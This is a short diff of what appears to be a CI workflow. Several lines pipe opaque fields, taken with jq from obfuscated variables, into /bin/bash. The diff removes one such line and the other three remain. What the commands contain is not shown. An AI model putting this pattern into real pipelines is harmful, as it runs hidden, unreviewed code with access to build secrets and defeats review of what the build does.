@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$nhmap595" | jq -r .o894 | /bin/bash
           echo $aaf389 | jq -r .bq360 | /bin/bash
           printf '%s' "$tkt34" | jq -r .g32 | /bin/bash
-          printf '%s' "$rixq39861" | jq -r .cuit66456 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
